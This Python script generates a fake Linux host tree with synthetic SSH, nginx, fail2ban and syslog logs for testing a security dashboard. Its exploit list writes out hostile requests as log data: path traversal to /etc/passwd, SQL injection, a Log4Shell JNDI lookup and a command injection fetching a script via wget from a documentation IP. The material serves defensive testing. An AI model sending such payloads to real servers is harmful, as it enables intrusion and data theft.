"""Generate a fake host tree with realistic attack logs for local testing.

Usage: python tools/gen_samples.py <root> [--days 2]

Uses only documentation IP ranges (RFC 5737). Scenarios: SSH brute force on a
key-only and on a password-enabled server, a successful password login from a
brute-forcing IP, web scanners, an exploit attempt, a leaked .env (200),
fail2ban bans and normal traffic.
"""

from __future__ import annotations

import argparse
import os
import random
from datetime import datetime, timedelta, timezone

USERS = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "user", "git", "deploy", "ftpuser", "pi", "guest"]
ATTACKERS = [f"203.0.113.{i}" for i in range(10, 40)] + [f"192.0.2.{i}" for i in range(50, 60)]
ADMIN_IP = "198.51.100.7"
VISITORS = [f"198.51.100.{i}" for i in range(100, 160)]
SCAN_PATHS = ["/.env", "/.git/config", "/wp-login.php", "/wp-admin/setup-config.php", "/phpmyadmin/index.php",
              "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/cgi-bin/luci", "/actuator/env",
              "/server-status", "/backup.sql", "/config.json", "/.aws/credentials", "/boaform/admin/formLogin"]
EXPLOITS = ["/index.php?page=../../../../etc/passwd", "/search?q=1%27%20UNION%20SELECT%20password%20FROM%20users--",
            "/?x=${jndi:ldap://203.0.113.99/a}", "/cgi-bin/test.cgi?cmd=;wget%20http://203.0.113.99/x.sh"]
NORMAL = ["/", "/bookings", "/fleet", "/api/health", "/_next/static/chunks/main.js", "/dashboard", "/favicon.ico"]


def syslog(ts: datetime, host: str, msg: str) -> str:
    return f"{ts.isoformat(timespec='microseconds')} {host} {msg}\n"


def nginx(ts: datetime, ip: str, req: str, status: int, size: int, ua: str) -> str:
    return f'{ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{req}" {status} {size} "-" "{ua}"\n'


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("root")
    ap.add_argument("--days", type=int, default=2)
    args = ap.parse_args()
    rnd = random.Random(206)
    now = datetime.now(timezone.utc).replace(microsecond=0)
    start = now - timedelta(days=args.days)
    root = args.root.rstrip("/")
    for d in ("var/log/nginx", "etc/ssh/sshd_config.d", "etc/fail2ban", "etc/ufw"):
        os.makedirs(f"{root}/{d}", exist_ok=True)

    auth, web, f2b = [], [], []
    pid = 40000
    t = start
    while t < now:
        t += timedelta(seconds=rnd.randint(20, 240))
        ip = rnd.choice(ATTACKERS)
        user = rnd.choice(USERS)
        pid += 1
        port = rnd.randint(30000, 65000)
        r = rnd.random()
        if r < 0.45:
            if user != "root":
                auth.append((t, syslog(t, "erp", f"sshd-session[{pid}]: Invalid user {user} from {ip} port {port}")))
            auth.append((t, syslog(t, "erp", f"sshd-session[{pid}]: Connection closed by "
                                            f"{'invalid' if user != 'root' else 'authenticating'} user {user} {ip} port {port} [preauth]")))
        elif r < 0.75:
            auth.append((t, syslog(t, "erp", f"sshd-session[{pid}]: Failed password for "
                                            f"{'' if user == 'root' else 'invalid user '}{user} from {ip} port {port} ssh2")))
        elif r < 0.85:
            auth.append((t, syslog(t, "erp", f"sshd-session[{pid}]: Received disconnect from {ip} port {port}:11: Bye Bye [preauth]")))
        else:
            auth.append((t, syslog(t, "erp", f"sshd[{pid}]: Unable to negotiate with {ip} port {port}: no matching key exchange method found.")))
        if rnd.random() < 0.02:
            f2b.append((t, f"{(t + timedelta(seconds=2)).strftime('%Y-%m-%d %H:%M:%S')},123 fail2ban.actions        [811]: NOTICE  [sshd] Ban {ip}\n"))

    # Admin logins by key every few hours.
    t = start
    while t < now:
        t += timedelta(hours=rnd.randint(3, 7))
        pid += 1
        auth.append((t, syslog(t, "erp", f"sshd-session[{pid}]: Accepted publickey for root from {ADMIN_IP} port 51022 ssh2: ED25519 SHA256:x")))

    # Scenarios land inside the current UTC day so "today" always shows them.
    midnight = now.replace(hour=0, minute=0, second=0)
    scenario = max(now - timedelta(hours=3), midnight + timedelta(minutes=1))
    if scenario + timedelta(minutes=4) > now:
        scenario = now - timedelta(minutes=4)

    # Scenario: password brute force that succeeds.
    bad = "203.0.113.66"
    t = scenario
    for i in range(40):
        pid += 1
        auth.append((t, syslog(t, "erp", f"sshd-session[{pid}]: Failed password for deploy from {bad} port {40000 + i} ssh2")))
        t += timedelta(seconds=3)
    pid += 1
    auth.append((t, syslog(t, "erp", f"sshd-session[{pid}]: Accepted password for deploy from {bad} port 40999 ssh2")))

    # Web traffic.
    t = start
    while t < now:
        t += timedelta(seconds=rnd.randint(2, 30))
        r = rnd.random()
        if r < 0.85:
            web.append((t, nginx(t, rnd.choice(VISITORS), f"GET {rnd.choice(NORMAL)} HTTP/1.1", 200, rnd.randint(500, 9000), "Mozilla/5.0")))
        elif r < 0.93:
            web.append((t, nginx(t, rnd.choice(ATTACKERS), f"GET {rnd.choice(SCAN_PATHS)} HTTP/1.1", 404, 150, "Mozilla/5.0 zgrab/0.x")))
        elif r < 0.96:
            web.append((t, nginx(t, rnd.choice(ATTACKERS), f"GET {rnd.choice(EXPLOITS)} HTTP/1.1", 400, 150, "curl/8.0")))
        elif r < 0.98:
            web.append((t, nginx(t, rnd.choice(ATTACKERS), "\\x16\\x03\\x01\\x00\\xee\\x01", 400, 157, "-")))
        else:
            web.append((t, nginx(t, rnd.choice(ATTACKERS), "GET /api/bookings?token=SECRET123 HTTP/1.1", 401, 40, "python-requests/2.31")))
    leak = scenario + timedelta(minutes=3)
    web.append((leak, nginx(leak, "192.0.2.77", "GET /.env HTTP/1.1", 200, 812, "Mozilla/5.0 (compatible; scanner)")))

    # System log: routine noise plus a few notable events. After the brute-forced login the
    # attacker creates a user and adds it to sudo - the story the dashboard should connect.
    system, host = [], "erp"
    t = start
    while t < now:
        t += timedelta(minutes=rnd.randint(3, 20))
        system.append((t, syslog(t, host, rnd.choice([
            "CRON[2211]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)",
            "systemd[1]: Started session-412.scope - Session 412 of User root.",
            "systemd-timesyncd[611]: Contacted time server 192.0.2.123:123 (ntp.ubuntu.com).",
            "kernel: [UFW BLOCK] IN=eth0 OUT= MAC=96:00:03:aa:bb:cc SRC=203.0.113.9 DST=10.0.0.2 LEN=40 PROTO=TCP SPT=48211 DPT=3389",
        ]))))
    oom = now - timedelta(hours=3, minutes=12)
    system.append((oom, syslog(oom, host, "kernel: Out of memory: Killed process 31337 (node) total-vm:2048000kB")))
    failed = now - timedelta(hours=1, minutes=40)
    system.append((failed, syslog(failed, host, "systemd[1]: nginx.service: Failed with result 'exit-code'.")))
    for minutes, msg in ((4, "useradd[5120]: new user: name=support, UID=1002, GID=1002, home=/home/support, shell=/bin/bash"),
                         (5, "usermod[5131]: add 'support' to group 'sudo'")):
        ts = scenario + timedelta(minutes=minutes)
        auth.append((ts, syslog(ts, host, msg)))

    for name, rows in (("var/log/auth.log", auth), ("var/log/nginx/access.log", web), ("var/log/fail2ban.log", f2b),
                       ("var/log/syslog", system)):
        with open(f"{root}/{name}", "w", encoding="utf-8", newline="\n") as fh:
            fh.writelines(line for _, line in sorted(rows, key=lambda x: x[0]))

    with open(f"{root}/etc/ssh/sshd_config", "w", newline="\n") as fh:
        fh.write("Include /etc/ssh/sshd_config.d/*.conf\nKbdInteractiveAuthentication no\nUsePAM yes\n"
                 "X11Forwarding yes\nPrintMotd no\nSubsystem sftp /usr/lib/openssh/sftp-server\n")
    with open(f"{root}/etc/ssh/sshd_config.d/50-cloud-init.conf", "w", newline="\n") as fh:
        fh.write("PasswordAuthentication yes\n")
    with open(f"{root}/etc/ufw/ufw.conf", "w", newline="\n") as fh:
        fh.write("ENABLED=yes\nLOGLEVEL=low\n")
    with open(f"{root}/etc/fail2ban/jail.local", "w", newline="\n") as fh:
        fh.write("[sshd]\nenabled = true\n")
    print(f"samples written to {root}: auth {len(auth)}, nginx {len(web)}, fail2ban {len(f2b)} lines")


if __name__ == "__main__":
    main()
